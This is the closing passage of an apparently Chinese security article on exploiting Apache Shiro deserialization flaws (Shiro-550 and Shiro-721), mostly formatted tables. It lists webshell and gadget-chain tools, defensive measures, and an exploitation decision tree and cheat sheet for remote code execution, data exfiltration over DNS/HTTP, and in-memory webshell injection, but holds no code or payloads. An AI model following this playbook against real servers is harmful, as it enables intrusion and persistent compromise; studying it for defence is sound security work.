style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">通用 Webshell 管理</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">支持 Shiro 加密通信 + 多类型内存马</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Behinder (冰蝎)</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">加密 Webshell 管理</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">支持 Filter/Servlet/Valve 内存马</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">ysoserial</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Gadget 链生成</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">标准工具，需手动加密和构造</span></span></p></td></tr></tbody></table>  
  
   
# 八、防御建议与总结  
## 8.1 防御措施  
<table><tbody><tr><td data-colwidth="192" width="192" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">措施</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">说明</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">效果</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">升级 Shiro 到 1.4.2+</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">使用 AES-GCM（认证加密），消除 Padding Oracle</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">彻底修复 550 和 721</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">自定义强随机密钥</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">如无法升级，至少将默认密钥替换为高强度随机密钥</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">阻止 550 默认密钥攻击</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">限制 Cookie 大小</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Tomcat maxHttpHeaderSize 设置合理值</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">增加内存马注入难度</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">移除不必要依赖</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">移除 commons-collections 等不使用的库</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">减少可用 Gadget 链</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">使用 RASP</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">运行时应用自保护，检测反序列化攻击</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">检测异常反序列化行为</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">WAF 规则</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">检测超长/异常 rememberMe Cookie</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">边界防护</span></span></p></td></tr><tr><td data-colwidth="192" width="192" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">定期更新依赖</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">保持所有依赖库在最新安全版本</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">减少攻击面</span></span></p></td></tr></tbody></table>## 8.2 总结决策树  
  
                      
Shiro  
   
漏洞利用决策树               
  
                            
│               
  
                
┌──── 知道密钥? ────┐               
  
                
│  
                     
│               
  
             
是 (550)  
              
否 (721)               
  
                
│  
                     
│               
  
          
┌── 有链? ──┐  
          
Padding Oracle 可用?               
  
          
│  
             
│  
            
│  
           
│               
  
        
有链  
          
无链  
         
可用  
         
不可用               
  
          
│  
             
│  
            
│  
           
│               
  
      
标准 RCE  
      
CB1(Shiro  
      
CBC-R  
       
需要其他               
  
     
CB1/CC6  
       
自带CB)  
        
伪造  
        
攻击面               
  
          
│  
             
│  
         
密文               
  
          
↓  
             
↓  
           
↓               
  
          
└─────── 出网? ──────┘               
  
                
│  
             
│               
  
              
能出网  
        
不出网               
  
                
│  
             
│               
  
            
DNS/HTTP  
      
内存马注入               
  
            
外带数据  
      
Valve 回显  
## 8.3 五种场景速查表  
<table><tbody><tr><td data-colwidth="115" width="115" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">场景</span></span></p></td><td data-colwidth="115" width="115" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">前提条件</span></span></p></td><td data-colwidth="124" width="124" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">利用方法</span></span></p></td><td data-colwidth="115" width="115" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">链推荐</span></span></p></td><td data-colwidth="115" width="115" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">备注</span></span></p></td></tr><tr><td data-colwidth="115" width="115" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">有Key有链</span></span></p></td><td data-colwidth="115" width="115" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">知道密钥 + 有 Gadget 库</span></span></p></td><td data-colwidth="124" width="124" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">直接加密发送</span></span></p></td><td data-colwidth="115" width="115" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CB1 / CC6 / CC5</span></span></p></td><td data-colwidth="115" width="115" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">最简单，一次请求 RCE</span></span></p></td></tr><tr><td data-colwidth="115" width="115" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">有Key无链</span></span></p></td><td data-colwidth="115" width="115" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">知道密钥 + 不确定链</span></span></p></td><td data-colwidth="124" width="124" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">SimplePrincipal 密钥验证</span></span></p></td><td data-colwidth="115" width="115" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CB1（Shiro自带）</span></span></p></td><td data-colwidth="115" width="115" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">先验证密钥，再用CB1</span></span></p></td></tr><tr><td data-colwidth="115" width="115" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">高版本JDK</span></span></p></td><td data-colwidth="115" width="115" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">知道密钥 + JDK11+</span></span></p></td><td data-colwidth="124" width="124" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">TemplatesImpl 本地加载</span></span></p></td><td data-colwidth="115" width="115" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CB1 / CC6</span></span></p></td><td data-colwidth="115" width="115" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">JDK版本不影响本地类加载</span></span></p></td></tr><tr><td data-colwidth="115" width="115" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">550 vs 721</span></span></p></td><td data-colwidth="115" width="115" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">550:知道密钥 / 721:有账号</span></span></p></td><td data-colwidth="124" width="124" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">550:加密 / 721:Padding Oracle</span></span></p></td><td data-colwidth="115" width="115" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CB1</span></span></p></td><td data-colwidth="115" width="115" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">721需数万请求</span></span></p></td></tr><tr><td data-colwidth="115" width="115" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">不出网</span></span></p></td><td data-colwidth="115" width="115" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">知道密钥 + 无外网</span></span></p></td><td data-colwidth="124" width="124" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">内存马 Valve 注入</span></span></p></td><td data-colwidth="115" width="115" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CB1 + TemplatesImpl</span></span></p></td><td data-colwidth="115" width="115" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">回显命令，绕过认证</span></span></p></td></tr></tbody></table>  
   
  
   
  
  
本文所有实验均在本地 Docker/JVM 环境中进行，仅用于安全研究学习目的。  
  
  
